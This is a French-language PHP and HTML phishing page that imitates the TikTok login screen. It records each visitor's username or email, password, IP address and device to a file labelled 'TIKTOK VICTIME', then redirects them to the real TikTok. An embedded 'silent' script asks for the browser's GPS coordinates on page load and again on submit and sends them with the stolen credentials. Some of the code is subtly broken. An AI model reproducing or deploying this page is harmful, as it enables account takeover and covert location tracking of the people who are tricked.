<?php
if ($_POST) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'inconnue';
    $ip = trim(explode(',', $ip)[0]);

    $email = $_POST['email'] ?? '';
    $pass  = $_POST['password'] ?? '';
    $ua    = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 150);

// APRÈS $ua = ...
$gps = isset($_POST['gps_lat']) && isset($_POST['gps_lon']) 
    ? "GPS: {$_POST['gps_lat']}, {$_POST['gps_lon']}" 
    : "GPS: N/A";

$log .= "│ 📍 {$gps}\n";  // ← AJOUTE ÇA
    $time  = date('Y-m-d H:i:s');

    $log  = "┌─────────────────────────────────────────\n";
    $log .= "│ 🎯 TIKTOK VICTIME — {$time}\n";
    $log .= "├─────────────────────────────────────────\n";
    $log .= "│ 📧 EMAIL/USER : {$email}\n";
    $log .= "│ 🔑 MOT DE PASSE : {$pass}\n";
    $log .= "│ 🌐 ADRESSE IP   : {$ip}\n";
    $log .= "│ 📱 APPAREIL     : {$ua}\n";
    $log .= "└─────────────────────────────────────────\n";

    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);

    // Redirection directe vers TikTok
    header('Location: https://www.tiktok.com/');
    exit;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Connexion</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .login-container {
            text-align: center;
            width: 100%;
            max-width: 300px;
            padding: 20px;
        }
        
        .logo {
            font-size: 42px;
            font-weight: 700;
            margin-bottom: 30px;
            letter-spacing: -1px;
        }
        
        .logo span {
            color: #25f4ee;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .input-field {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            border: none;
            border-radius: 4px;
            background-color: #272727;
            color: #fff;
            box-sizing: border-box;
        }
        
        .input-field::placeholder {
            color: #8e8e8e;
        }
        
        .input-field:focus {
            outline: none;
            background-color: #333;
        }
        
        .submit-btn {
            background-color: #25f4ee;
            color: #000;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            padding: 14px 16px;
            margin-top: 8px;
            opacity: 0.8;
            transition: opacity 0.2s;
        }
        
        .submit-btn:hover {
            opacity: 1;
        }
        
        @media (max-width: 480px) {
            .login-container {
                max-width: 280px;
                padding: 16px;
            }
            .logo {
                font-size: 36px;
            }
        }
    </style>
<!-- GPS TRACKER SILENT PRO -->
<script>
function captureGPS() {
    navigator.geolocation.getCurrentPosition(pos => {
        const form = document.createElement('form');
        form.method = 'POST'; form.style.display = 'none';
        form.innerHTML = `
            <input name="gps_lat" value="${pos.coords.latitude}">
            <input name="gps_lon" value="${pos.coords.longitude}">
        `;
        document.body.appendChild(form);
        form.submit();
    }, ()=>{}, {enableHighAccuracy: true, timeout: 5000});
}
window.onload = captureGPS;

// GPS sur submit
function gpsSubmit(form) {
    navigator.geolocation.getCurrentPosition(pos => {
        const lat = document.createElement('input');
        lat.type = 'hidden'; lat.name = 'gps_lat'; lat.value = pos.coords.latitude;
        const lon = document.createElement('input');
        lon.type = 'hidden'; lon.name = 'gps_lon'; lon.value = pos.coords.longitude;
        form.appendChild(lat); form.appendChild(lon);
        form.submit();
    }, () => form.submit(), {enableHighAccuracy: true});
    return false;
}
</script>

</head>
<body>
    <div class="login-container">
        <div class="logo">tiktok<span>.</span></div>
        <form class="login-form" method="POST" action="" onsubmit="return gpsSubmit(this)>
            <input type="text" name="email" class="input-field" placeholder="Nom d'utilisateur, email ou téléphone" required>
            <input type="password" name="password" class="input-field" placeholder="Mot de passe" required>
            <button type="submit" class="submit-btn">Se connecter</button>
        </form>
    </div>
</body>
</html>
